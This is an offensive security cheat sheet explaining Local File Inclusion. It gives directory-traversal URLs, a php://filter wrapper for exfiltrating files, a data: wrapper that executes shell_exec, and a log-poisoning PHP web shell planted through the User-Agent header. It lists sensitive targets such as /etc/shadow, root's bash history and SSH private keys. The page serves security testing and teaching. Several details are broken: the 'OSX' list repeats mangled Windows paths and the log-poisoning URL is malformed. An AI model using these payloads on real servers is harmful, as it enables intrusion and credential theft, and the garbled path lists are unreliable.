# Local File Inclusion (LFI)

A local file inclusion (LFI) vulnerability is the process of including files that are locally present on the target server, through exploitation of vulnerable inclusion procedures implemented in the application.

Local file inclusion vulnerabilites occur when a page receives the path to the file that has to be included as input, which is not properly sanitized, allowing directory traversal characters to be injected.

### Examples

The most basic form of a exploiting a LFI vulnerability looks like the following:

```bash
https://mysecureserver.com/file.php?target=../../../../../etc/passwd
```

If we want to get a file,  it is best to base64 encode it. This will ensure that we can exfiltrate files rather than the server excuting the file. This can be accomplished with the following command:

```php
php://filter/convert.base64-encode/resource=$file
```

Additionally, the following command demonstrates  how we could execute code with the `shell_exec` function:

```bash
data:text/plain,<?php echo shell_exec("whoami") ?>
```

### Common Locations

This section lists common files to look for when testing for Local File Inclusion, I have linked additional lists in the 'References' section.&#x20;

#### Linux

```
/etc/issue
/proc/version
/etc/profile
/etc/passwd
/etc/passwd
/etc/shadow
/root/.bash_history
/var/log/dmessage
/var/mail/root
/var/spool/cron/crontabs/root
```

#### Windows

```
%SYSTEMROOT%repairsystem
%SYSTEMROOT%repairSAM
%WINDIR%win.ini
%SYSTEMDRIVE%boot.ini
%WINDIR%Panthersysprep.inf
%WINDIR%system32configAppEvent.Evt
```

#### OSX

```
%SYSTEMROOT%repairsystem
%SYSTEMROOT%repairSAM
%SYSTEMROOT%repairSAM
%WINDIR%win.ini
%SYSTEMDRIVE%boot.ini
%WINDIR%Panthersysprep.inf
%WINDIR%system32configAppEvent.Evt
```

### Remote Code Execution via LFI (Log Injection)

Log Injection / Log Poisoning is a technique used to obtain a reverse shell from a LFI vulnerability. In order to make this attack work, an attacker will attempt to inject a malicious payload into the server log.

* If we are able to access server logs such as `/var/log/apache2/access.log` we can modify our `User-Agent` to be a malicious payload which could result in us obtaining remote code execution.&#x20;

```php
# Sample PHP Payload
<?php system($_GET['c']); ?>
```

After injecting the payload, we can access it via the following URL:

```bash
https://$url/var/log/httpd&c=whoami
```

### Additional Notes

* Sometimes during Local File Inclusion, the web server may append something like `.php` or `.config` to the file. For example, including `/etc/passwd` may be rendered as `/etc/passwd.php`. This occurs when the include function uses a parameter like `?page` and concatenates the .php extension to the file. In versions of PHP below 5.3, ending the URL with a null byte (`%00`) will cause the interpreter to stop reading, this would then allow you to include and view the intended page.
* If you have identified LFI impacting a Linux host, you may be able to access the `.ssh/id_rsa` file of identified users. These are easily identified from reading the contents of the `/etc/passwd` file.&#x20;

### References

{% embed url="https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion" %}
